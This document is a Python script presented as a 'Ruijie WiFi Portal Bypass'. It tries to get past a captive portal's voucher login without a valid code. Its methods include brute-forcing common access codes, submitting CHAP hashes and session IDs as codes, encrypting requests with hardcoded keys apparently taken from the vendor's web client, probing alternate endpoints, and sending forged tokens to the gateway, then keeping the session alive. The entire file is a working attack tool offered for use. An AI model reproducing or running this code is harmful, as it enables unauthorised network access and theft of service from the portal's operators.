#!/usr/bin/env python3
"""
Ruijie WiFi Portal Bypass - multi-approach, no codes needed.
"""
import json, os, re, sys, time, urllib.parse, hashlib, base64
import requests, urllib3
urllib3.disable_warnings()

logging = __import__('logging')
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("ruijie")

HAS_CRYPTO = False
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    from Crypto.Hash import MD5 as CryptoMD5
    HAS_CRYPTO = True
except ImportError:
    pass

RENDER_KEY = hashlib.md5(b"RenderSecretKey2026!@#").digest()
WEB_KEY = b"RjYkhwzx$2018!"

BANNER = r"""
  _____  _    _ _____       _ _____ ______
 |  _  /| |  | | | |   _   | | | | |  __|
 |  __ \| |  | |_   _|     | |_   _|  ____|
 | | \ \| |__| |_| |_ | |__| |_| |_| |____
 | |__) | |  | | | |       | | | | | |__
 |_|  \_\____/|_____| \____/|_____|______|
"""


def parse_octal(s):
    if not s: return b""
    out = bytearray(); i = 0
    while i < len(s):
        if s[i] == '\\' and i+3 < len(s) and s[i+1:i+4].isdigit():
            out.append(int(s[i+1:i+4], 8)); i += 4
        else:
            out.append(ord(s[i])); i += 1
    return bytes(out)


def evp_kdf(passwd, salt, key_len=32, iv_len=16):
    dtot = b""
    d = b""
    while len(dtot) < key_len + iv_len:
        d = CryptoMD5.new(d + passwd + salt).digest()
        dtot += d
    return dtot[:key_len], dtot[key_len:key_len+iv_len]


def cryptojs_encrypt(plaintext, passphrase):
    salt = os.urandom(8)
    key, iv = evp_kdf(passphrase, salt, 32, 16)
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.b64encode(b"Salted__" + salt + ct).decode()


def check_online(sess=None):
    s = sess or requests
    try:
        r = s.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3, allow_redirects=False)
        return r.status_code == 204
    except:
        return False


def get_session(sess):
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10)
    parsed = urllib.parse.urlparse(r.url)
    params = urllib.parse.parse_qs(parsed.query)
    host = f"{parsed.scheme}://{parsed.netloc}"
    r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
    sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
    return sid, host, params


def try_auth(sess, api_url, data):
    try:
        r = sess.post(api_url, json=data, timeout=5)
        j = r.json()
        return j.get("success") == True and j.get("result", {}).get("authResult") == "1", j
    except:
        return False, {}


def try_auth_form(sess, api_url, data):
    try:
        r = sess.post(api_url, data=data, timeout=5)
        j = r.json()
        return j.get("success") == True and j.get("result", {}).get("authResult") == "1", j
    except:
        return False, {}


def activate_gateway(sess, logon_url):
    try:
        r = sess.get(logon_url, timeout=5, allow_redirects=False)
        return True
    except:
        return False


def ping_keepalive(sess, gw_addr, gw_port, token):
    url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={token}"
    try:
        r = sess.get(url, timeout=5, allow_redirects=False)
        return "denied" not in r.headers.get("Location", "")
    except:
        return False


def main():
    print(BANNER)
    log.info("Ruijie Bypass - trying all approaches...")

    sess = requests.Session()
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    sess.verify = False

    while True:
        try:
            sid, host, params = get_session(sess)
            if not sid:
                log.warning("No session, retrying...")
                time.sleep(3)
                continue

            api_url = f"{host}/api/auth/voucher/?lang=en_US"
            gw_addr = params.get("gw_address", ["192.168.10.1"])[0]
            gw_port = params.get("gw_port", ["2060"])[0]
            chap_id = parse_octal(params.get("chap_id", [""])[0])
            chap_chal = parse_octal(params.get("chap_challenge", [""])[0])
            chap_md5 = hashlib.md5(chap_id + b"123456" + chap_chal).hexdigest()

            log.info(f"SID: {sid}  GW: {gw_addr}:{gw_port}")

            # ---- Approach 1: Plain JSON with common codes ----
            log.info("[1] Trying common codes...")
            for code in ["123456", "000000", "111111", "888888", "666666",
                         "999999", "123123", "321321", "520520", "131420",
                         "100000", "200000", "300000", "500000"]:
                ok, data = try_auth(sess, api_url, {"accessCode": code, "sessionId": sid, "apiVersion": 1})
                if ok:
                    log.info(f"  *** FOUND CODE: {code} ***")
                    logon_url = data["result"]["logonUrl"]
                    activate_gateway(sess, logon_url)
                    token = urllib.parse.parse_qs(urllib.parse.urlparse(logon_url).query).get("token", [sid])[0]
                    log.info(f"  ONLINE via code {code}!")
                    return run_keepalive(sess, gw_addr, gw_port, token)

            # ---- Approach 2: CHAP-MD5 hash as code ----
            log.info("[2] Trying CHAP-MD5 as code...")
            ok, data = try_auth(sess, api_url, {"accessCode": chap_md5, "sessionId": sid, "apiVersion": 1})
            if ok:
                log.info("  *** CHAP-MD5 worked! ***")
                return run_after_auth(sess, data, gw_addr, gw_port, sid)

            # ---- Approach 3: sessionId as code ----
            log.info("[3] Trying sessionId as code...")
            ok, data = try_auth(sess, api_url, {"accessCode": sid, "sessionId": sid, "apiVersion": 1})
            if ok:
                log.info("  *** SID as code worked! ***")
                return run_after_auth(sess, data, gw_addr, gw_port, sid)

            # ---- Approach 4: Encrypted with RenderSecretKey ----
            if HAS_CRYPTO:
                log.info("[4] Trying RenderSecretKey encrypted...")
                payload = json.dumps({
                    "sessionId": sid, "accessCode": "123456",
                    "password": chap_md5, "apiVersion": 1,
                    "chap_id": params.get("chap_id", [""])[0],
                    "chap_challenge": params.get("chap_challenge", [""])[0],
                })
                iv = os.urandom(16)
                cipher = AES.new(RENDER_KEY, AES.MODE_CBC, iv=iv)
                ct = cipher.encrypt(pad(payload.encode(), AES.block_size))
                enc = base64.b64encode(iv + ct).decode()
                ok, data = try_auth(sess, api_url, {"data": enc})
                if ok:
                    log.info("  *** RenderSecretKey worked! ***")
                    return run_after_auth(sess, data, gw_addr, gw_port, sid)

            # ---- Approach 5: CryptoJS encrypted with web key ----
            if HAS_CRYPTO:
                log.info("[5] Trying CryptoJS encrypted with web key...")
                password = urllib.parse.unquote(params.get("chap_id", [""])[0]) + \
                           urllib.parse.unquote(params.get("chap_challenge", [""])[0]) + "123456"
                if password:
                    enc_code = cryptojs_encrypt(password, WEB_KEY)
                    ok, data = try_auth_form(sess, api_url, {
                        "accessCode": enc_code, "sessionId": sid, "apiVersion": 1
                    })
                    if ok:
                        log.info("  *** CryptoJS encrypted worked! ***")
                        return run_after_auth(sess, data, gw_addr, gw_port, sid)

            # ---- Approach 6: /ga_voucherlogin endpoint (Reyee flow) ----
            log.info("[6] Trying /ga_voucherlogin...")
            ga_url = f"{host}/ga_voucherlogin"
            if HAS_CRYPTO and chap_id:
                password = urllib.parse.unquote(params.get("chap_id", [""])[0]) + \
                           urllib.parse.unquote(params.get("chap_challenge", [""])[0]) + "123456"
                enc_code = cryptojs_encrypt(password, WEB_KEY)
                try:
                    r = sess.post(ga_url, data={
                        "accessCode": enc_code,
                        "ip": params.get("ip", [""])[0],
                        "mac": params.get("mac", [""])[0],
                        "url": "http://www.baidu.com/",
                    }, timeout=5)
                    data = r.json()
                    if data.get("success") == True and data.get("result", {}).get("authResult") == "1":
                        log.info("  *** /ga_voucherlogin worked! ***")
                        logon_url = data["result"]["logonUrl"]
                        return run_after_auth(sess, data, gw_addr, gw_port, sid)
                except:
                    pass

            # ---- Approach 7: Try IS_EG=1 mode ----
            log.info("[7] Trying IS_EG=1 mode...")
            r = sess.get(f"{host}/api/auth/wifidog?stage=portal&IS_EG=1&{urllib.parse.urlencode({k: v[0] for k, v in params.items()})}", timeout=10)
            sid2 = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
            if sid2:
                ok, data = try_auth(sess, api_url, {"accessCode": "123456", "sessionId": sid2, "apiVersion": 1})
                if ok:
                    log.info("  *** IS_EG=1 worked! ***")
                    return run_after_auth(sess, data, gw_addr, gw_port, sid2)

            # ---- Approach 8: Try hitting gateway directly with various tokens ----
            log.info("[8] Trying direct gateway auth...")
            for token_val in [sid, chap_md5, hashlib.md5(sid.encode()).hexdigest()]:
                if ping_keepalive(sess, gw_addr, gw_port, token_val):
                    log.info(f"  *** Gateway accepted token! ***")
                    if check_online(sess):
                        log.info("  ONLINE!")
                        return run_keepalive(sess, gw_addr, gw_port, token_val)

            log.warning("All approaches failed, retrying...")
            sess.close()
            time.sleep(5)
            sess = requests.Session()
            sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
            sess.verify = False

        except KeyboardInterrupt:
            log.info("Stopped")
            sys.exit(0)
        except Exception as e:
            log.warning(f"Error: {e}")
            time.sleep(5)


def run_after_auth(sess, data, gw_addr, gw_port, sid):
    logon_url = data["result"]["logonUrl"]
    token = urllib.parse.parse_qs(urllib.parse.urlparse(logon_url).query).get("token", [sid])[0]
    activate_gateway(sess, logon_url)
    if check_online(sess):
        log.info("ONLINE!")
        run_keepalive(sess, gw_addr, gw_port, token)
    else:
        log.warning("Auth worked but still offline")
        time.sleep(5)


def run_keepalive(sess, gw_addr, gw_port, token):
    ping_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={token}"
    log.info(f"Keepalive on {gw_addr}:{gw_port}")
    while True:
        if not ping_keepalive(sess, gw_addr, gw_port, token):
            log.warning("Session lost, reconnecting...")
            break
        if not check_online(sess):
            log.warning("Offline, reconnecting...")
            break
        time.sleep(3)


if __name__ == "__main__":
    main()
